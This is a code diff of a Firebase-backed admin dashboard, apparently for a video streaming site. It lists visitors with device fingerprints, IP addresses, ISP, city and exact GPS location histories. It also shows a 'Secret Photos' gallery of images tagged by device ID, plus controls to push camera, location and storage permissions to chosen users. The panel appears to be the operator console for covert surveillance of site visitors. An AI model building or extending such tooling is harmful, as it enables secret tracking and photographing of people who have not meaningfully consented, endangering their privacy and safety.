-              let banBadge = isHacker ? '<span class="badge-banned" style="background:#000; color:#ff4d4d; border:1px solid #ff4d4d; display:inline-block;">☠️ HACKER</span>' : (isBanned ? '<span class="badge-banned" style="display:inline-block;">🚫 Banned</span>' : '');
-              let statBadge = liveBadge + banBadge;
-
-              const shortOs = u.device?.os || 'Unknown';
-              const devStr = u.device ? `${u.device.os} - ${u.device.browser}` : 'Unknown';
-              
+          const tb = document.getElementById('userTableBody'); tb.innerHTML = ''; const users = snap.val() || {};
+          Object.keys(users).reverse().forEach(k => {
+              const u = users[k];
               tb.innerHTML += `<tr>
-                  <td style="font-family:monospace; font-size:0.8rem; color:var(--red);">${k}</td>
-                  <td>${shortOs}</td>
-                  <td>${u.firstVisit ? new Date(u.firstVisit).toLocaleString() : 'None'}</td>
-                  <td>${statBadge}</td>
-                  <td style="text-align:right; min-width:140px;">
-                      <button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="viewUser('${k}')">Full Details</button>
-                      <button class="btn btn-danger" style="padding:0.4rem 0.6rem; margin-left:5px;" onclick="deleteUserRecord('${k}')" title="Delete User">🗑️</button>
-                  </td>
+                  <td style="font-family:monospace; color:var(--red);">${k}</td>
+                  <td>${u.deviceApproved ? '✅ Yes' : '❌ No'}</td>
+                  <td>${u.firstVisit ? new Date(u.firstVisit).toLocaleString() : ''}</td>
+                  <td>${u.banned ? '🚫 Banned' : (u.status === 'Live' ? '🟢 Live' : '🔴 Offline')}</td>
+                  <td style="text-align:right;"><button class="btn btn-danger" style="padding:0.4rem;" onclick="remove(ref(db, 'users/${k}'))">Delete Record</button></td>
               </tr>`;
-
-              if(!isBanned) { 
-                  checkList.innerHTML += `<label class="user-chk-lbl" data-search="${k.toLowerCase()} ${devStr.toLowerCase()}"><input type="checkbox" value="${k}" class="user-target-cb" disabled> <span style="font-family:monospace; color:var(--text);">${k}</span> <span style="color:var(--muted); font-size:0.75rem;">(${devStr})</span></label>`; 
-              }
-          });
-
-          document.getElementById('allowAllUsersCb').addEventListener('change', function() {
-              const cbs = document.querySelectorAll('.user-target-cb');
-              cbs.forEach(cb => { cb.disabled = this.checked; if(this.checked) cb.checked = false; });
           });
       });
 
-      // --- USER PROFILE MODAL ---
-      let viewingUserId = null;
-      window.viewUser = (id) => {
-          viewingUserId = id; 
-          const u = allUsersRaw[id];
-          
-          if(!u) return alert("No tracking data found for this User ID.");
-
-          const d = u.device || {}; const n = u.network || {};
-
-          document.getElementById('umTitle').innerText = id;
-          document.getElementById('umIdSource').innerText = d.idSource || 'Legacy / Web';
-          document.getElementById('umType').innerText = d.type || 'None'; document.getElementById('umOS').innerText = d.os || 'None';
-          document.getElementById('umBrowser').innerText = (d.browser || 'None') + (d.cookieEnabled ? ' (Cookies: Yes)' : '');
-          document.getElementById('umISP').innerText = n.org || 'None'; document.getElementById('umLocation').innerText = `${n.city || ''}, ${n.region || 'None'}`;
-          document.getElementById('umIp').innerText = n.ip || 'None'; document.getElementById('umGPU').innerText = d.gpu || 'None';
-          document.getElementById('umHardware').innerText = `RAM: ${d.ram || '?'} | CPU: ${d.cores || '?'}`;
-          document.getElementById('umScreen').innerText = `${d.screen || '?'} | Touch: ${d.touch || 'No'}`;
-          document.getElementById('umTz').innerText = `${d.tz || '?'} | ${d.lang || '?'}`;
-          document.getElementById('umFirst').innerText = u.firstVisit ? new Date(u.firstVisit).toLocaleString() : 'None';
-          document.getElementById('umLast').innerText = u.lastActive ? new Date(u.lastActive).toLocaleString() : 'None';
-
-          const banBtn = document.getElementById('banToggleBtn');
-          banBtn.innerText = u.banned ? "Unban Device" : "Ban Device";
-          banBtn.style.background = u.banned ? "var(--green)" : "var(--red)";
-          banBtn.onclick = () => { update(ref(db, 'users/'+id), {banned: !u.banned}); document.getElementById('userModal').style.display='none'; };
-
-          get(ref(db, `users/${id}/custom_perms`)).then(snap => {
-              const perms = snap.val() || {};
-              document.getElementById('pushCam').checked = perms.camera || false;
-              document.getElementById('pushLoc').checked = perms.location || false;
-              document.getElementById('pushStore').checked = perms.storage || false;
-          });
-
-          const actionBox = document.getElementById('umActionsList'); 
-          if(u.actions) {
-              const acts = Object.values(u.actions).sort((a,b) => new Date(b.time) - new Date(a.time)).slice(0, 100);
-              let actsHtml = ''; acts.forEach(a => { actsHtml += `<div class="action-row"><span style="color:var(--text);">${a.action}</span><span style="color:var(--muted);">${new Date(a.time).toLocaleString()}</span></div>`; });
-              actionBox.innerHTML = actsHtml;
-          } else { actionBox.innerHTML = '<div class="action-row" style="color:var(--muted); justify-content:center;">No live actions recorded yet.</div>'; }
-
-          const locBox = document.getElementById('umLocationHistory'); let allLocs = [];
-          if (u.locationHistory) { Object.values(u.locationHistory).forEach(loc => { allLocs.push({ type: 'Network (IP)', text: `${loc.city}, ${loc.region} (IP: ${loc.ip})`, time: loc.time }); }); }
-          if (u.gpsHistory) { Object.values(u.gpsHistory).forEach(gps => { allLocs.push({ type: 'Exact GPS', text: `Accurate to ${gps.accuracy} <br> <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}" target="_blank" style="color:var(--green); text-decoration:underline; font-size: 0.8rem;">📍 Open Maps</a>`, time: gps.time }); }); }
-          if(allLocs.length > 0) {
-              allLocs.sort((a,b) => new Date(b.time) - new Date(a.time)).slice(0, 50);
-              let locsHtml = ''; allLocs.forEach(l => { locsHtml += `<div class="action-row" style="flex-direction:column; align-items:flex-start;"><div style="width:100%; display:flex; justify-content:space-between; margin-bottom:3px;"><span style="color:var(--text); font-weight:600;">${l.type}</span><span style="color:var(--muted); font-size:0.75rem;">${new Date(l.time).toLocaleString()}</span></div><span style="color:var(--muted); font-size:0.8rem;">${l.text}</span></div>`; });
-              locBox.innerHTML = locsHtml;
-          } else { locBox.innerHTML = '<div class="action-row" style="color:var(--muted); justify-content:center;">No location history available.</div>'; }
-
-          const htb = document.getElementById('umHistory'); 
-          if(u.history) {
-              let histHtml = ''; Object.values(u.history).forEach(h => { histHtml += `<tr><td>${h.title}</td><td>${h.plays}</td><td>${h.totalDuration}s</td></tr>`; }); htb.innerHTML = histHtml;
-          } else { htb.innerHTML = '<tr><td colspan="3" style="text-align:center; color:var(--muted);">No history yet.</td></tr>'; }
-
-          document.getElementById('userModal').style.display = 'flex';
-      };
-
-      document.getElementById('pushPermBtn').addEventListener('click', () => {
-          if(!viewingUserId) return;
-          const rules = { camera: document.getElementById('pushCam').checked, location: document.getElementById('pushLoc').checked, storage: document.getElementById('pushStore').checked };
-          update(ref(db, `users/${viewingUserId}/custom_perms`), rules).then(() => { alert("Permissions Pushed! If user is live, their screen will securely check access."); });
-      });
-
-      // --- ADS, SOCIALS & SETTINGS LOGIC ---
-      function loadSecretPhotos() {
-          const statusTxt = document.getElementById('photosLoadingStatus');
-          const grid = document.getElementById('photosGrid');
-          statusTxt.innerText = "Loading photos from database...";
-          grid.innerHTML = ''; 
+      // 4. Secret Photos
+      window.loadSecretPhotos = () => {
+          const grid = document.getElementById('photosGrid'); grid.innerHTML = ''; 
           get(ref(db, 'secret_photos')).then((snap) => {
-              if (!snap.exists()) { statusTxt.innerText = "No new photos found."; return; }
-              const data = snap.val(); const keys = Object.keys(data).reverse(); 
-              statusTxt.innerText = `${keys.length} Photos found.`;
-              keys.forEach(key => {
-                  const photoData = data[key]; const url = photoData.imageBase64; const timeStr = new Date(photoData.time).toLocaleString(); const devId = photoData.deviceId || 'Unknown';
-                  grid.innerHTML += `
-                      <div class="photo-card" id="card-${key}">
-                          <a href="${url}" target="_blank"><img src="${url}" loading="lazy"></a>
-                          <p title="${devId}">User ID: ${devId.substring(0,6)}...</p>
-                          <p style="font-size:0.65rem; color:var(--muted);">${timeStr}</p>
-                          <button class="btn btn-danger" style="padding:0.4rem; font-size:0.75rem; width:100%; margin-top:5px;" onclick="deleteSecretPhoto('${key}')">🗑️ Delete</button>
-                      </div>`;
+              const data = snap.val() || {}; 
+              Object.keys(data).reverse().forEach(k => {
+                  grid.innerHTML += `<div style="background:var(--surf2); padding:10px; border-radius:12px; text-align:center;"><a href="${data[k].imageBase64}" target="_blank"><img src="${data[k].imageBase64}" style="width:100%; height:150px; object-fit:cover; border-radius:8px;"></a><p style="font-size:0.7rem; color:var(--muted); margin:5px 0;">${new Date(data[k].time).toLocaleString()}</p><button class="btn btn-danger" style="padding:0.4rem; width:100%;" onclick="remove(ref(db, 'secret_photos/${k}')); this.parentElement.remove();">Delete</button></div>`;
               });
-          }).catch((error) => { statusTxt.innerText = "Error loading photos!"; });
-      }
+          });
+      };
       document.getElementById('refreshPhotosBtn').addEventListener('click', loadSecretPhotos);
-      window.deleteSecretPhoto = function(key) { if(confirm("Delete this photo permanently?")) { remove(ref(db, 'secret_photos/' + key)).then(() => { const card = document.getElementById('card-' + key); if (card) card.remove(); }); } };
-
-      get(ref(db, 'settings/ad')).then(snap => { const data = snap.val(); if(data) { document.getElementById('adEnabled').value = data.enabled ? 'true' : 'false'; document.getElementById('adType').value = data.type || 'image'; document.getElementById('adUrl').value = data.url || ''; document.getElementById('adSkip').value = data.skipTime || 5; } });
-      document.getElementById('saveAdBtn').addEventListener('click', () => { set(ref(db, 'settings/ad'), { enabled: document.getElementById('adEnabled').value === 'true', type: document.getElementById('adType').value, url: document.getElementById('adUrl').value, skipTime: document.getElementById('adSkip').value }).then(() => alert("Ad Settings Saved!")); });
-      
-      onValue(ref(db, 'settings/social'), snap => { const d = snap.val(); if(d) { document.getElementById('socDiscord').value = d.discord || ''; document.getElementById('socTelegram').value = d.telegram || ''; document.getElementById('socWhatsapp').value = d.whatsapp || ''; document.getElementById('socInstagram').value = d.instagram || ''; document.getElementById('socX').value = d.x || ''; } }, {onlyOnce:true});
-      document.getElementById('saveSocBtn').addEventListener('click', () => { set(ref(db, 'settings/social'), { discord: document.getElementById('socDiscord').value, telegram: document.getElementById('socTelegram').value, whatsapp: document.getElementById('socWhatsapp').value, instagram: document.getElementById('socInstagram').value, x: document.getElementById('socX').value }).then(() => alert("Social Links Updated!")); });
-      
-      onValue(ref(db, 'settings/general'), snap => { const data = snap.val(); if(data?.favicon) document.getElementById('setFavicon').value = data.favicon; if(data?.apkLink) document.getElementById('setApkLink').value = data.apkLink; }, {onlyOnce:true});
-      document.getElementById('saveSetBtn').addEventListener('click', () => { update(ref(db, 'settings/general'), { favicon: document.getElementById('setFavicon').value, apkLink: document.getElementById('setApkLink').value }).then(()=>alert("Settings updated!")); });
-      
-      onValue(ref(db, 'wipeBtn'), () => {});
-      document.getElementById('wipeBtn').addEventListener('click', () => { if(confirm("Danger: Delete ALL Videos?")) { remove(ref(db, 'videos')).then(()=>alert("Wiped!")); } });
   }
 </script>
 </body>
 </html>
+
